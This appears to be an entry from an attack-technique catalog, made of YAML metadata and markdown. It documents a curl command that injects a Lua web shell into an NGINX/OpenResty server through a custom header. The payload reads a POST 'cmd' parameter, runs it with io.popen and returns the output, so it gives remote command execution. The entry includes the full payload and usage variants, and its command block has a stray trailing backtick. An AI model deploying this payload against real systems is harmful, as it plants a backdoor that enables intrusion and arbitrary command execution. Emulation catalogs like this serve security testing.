---
data: >-
  curl localhost/z/ -H "host: x.x" -H 'x-ginoah: content_by_lua_block
  {ngx.req.read_body();local post_args = ngx.req.get_post_args();local cmd =
  post_args["cmd"];if cmd then f_ret = io.popen(cmd);local ret =
  f_ret:read("*a");ngx.say(string.format("%s", ret));end;}'
tags:
  - injection
  - lua
type: command
output: HTTP response indicating log write
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:49.875Z'
id: 7b88f5e7-6a0b-4a57-b97e-324e6c3bc757
verified: false
validated: true
submitted: true
---
# curl-inject-lua-code

## Command

```bash
curl localhost/z/ -H "host: x.x" -H 'x-ginoah: content_by_lua_block {ngx.req.read_body();local post_args = ngx.req.get_post_args();local cmd = post_args["cmd"];if cmd then f_ret = io.popen(cmd);local ret = f_ret:read("*a");ngx.say(string.format("%s", ret));end;}'`
```

## Description

Sends an HTTP request with custom headers to inject Lua code into the access_log file on the NGINX server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "host: x.x"` | Sets the Host header for virtual host routing | Yes |
| `-H 'x-ginoah: ...'` | Custom header carrying the Lua code payload | Yes |

## Examples

### Basic Usage

```bash
curl localhost/z/ -H "host: x.x" -H 'x-ginoah: <lua code>'
```

### Advanced Usage

```bash
curl -v localhost/z/ -H "host: x.x" -H 'x-ginoah: <lua>' --max-time 10
```

## Expected Output

HTTP 404 or empty body, but Lua written to /tmp/luashell.

## Related

- [[procedures/Inject-Lua-Code-via-HTTP-Request]]
